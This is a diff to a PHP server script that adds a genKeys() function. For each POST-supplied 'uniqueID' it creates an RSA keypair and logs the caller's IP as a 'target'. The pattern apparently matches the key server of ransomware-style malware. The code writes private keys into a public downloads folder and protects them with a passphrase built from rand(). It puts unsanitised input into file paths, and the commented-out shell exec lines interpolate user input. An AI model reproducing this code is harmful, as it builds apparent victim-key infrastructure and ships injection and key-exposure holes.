@@ -12,6 +12,41 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 } 
 
+function genKeys($targetID) {
+  // Adapted from http://goo.gl/2qN9zO
+  $passAlpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+  $genPass = array(); 
+  $passAlphaLength = strlen($passAlpha) - 1;
+  
+  for ($i = 0; $i < 16; $i++) {
+      $getChar = rand(0, $passAlphaLength);
+      $genPass[] = $passAlpha[$getChar];
+  }
+  
+  // Adapted from http://goo.gl/7MqUYh
+
+  // Generate a strong passphrase
+  $genPass = implode($genPass);
+  
+  // Create the keypair
+  $genKey = openssl_pkey_new();
+  
+  // Get private key
+  openssl_pkey_export($genKey, $privKey, $genPass);
+  
+  // Get public key
+  $pubKey = openssl_pkey_get_details($genKey);
+  $pubKey = $pubKey["key"];
+
+  $setPrivKey = fopen("/var/www/html/downloads/" . $targetID . "_priv.pem", "w") or die("Unable to open file!");
+  fwrite($setPrivKey, $privKey);
+  fclose($setPrivKey);
+  
+  $setPubKey = fopen("/var/www/html/downloads/" . $targetID . "_pub.pem", "w") or die("Unable to open file!");
+  fwrite($setPubKey, $pubKey);
+  fclose($setPubKey);
+}
+
 $getTargetID = $_POST['uniqueID'];
 $getTargetIP = $_SERVER['REMOTE_ADDR'];
 
@@ -32,6 +67,7 @@ if (isset($_POST['uniqueID']) && !empty($_POST['uniqueID'])) {
        //exec("openssl genrsa -out /tmp/$getTargetID.priv.pem 4096");
        //exec("openssl rsa -pubout -in /tmp/$getTargetID.priv.pem -out /var/www/html/downloads/$getTargetID.pub.pem");
        //exec("cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > /var/www/html/downloads/$getTargetID.key.bin");
+       genKeys($getTargetID); 
    } else {
        echo "Error: " . $sqlStmt . "<br>" . $conn->error;
    }
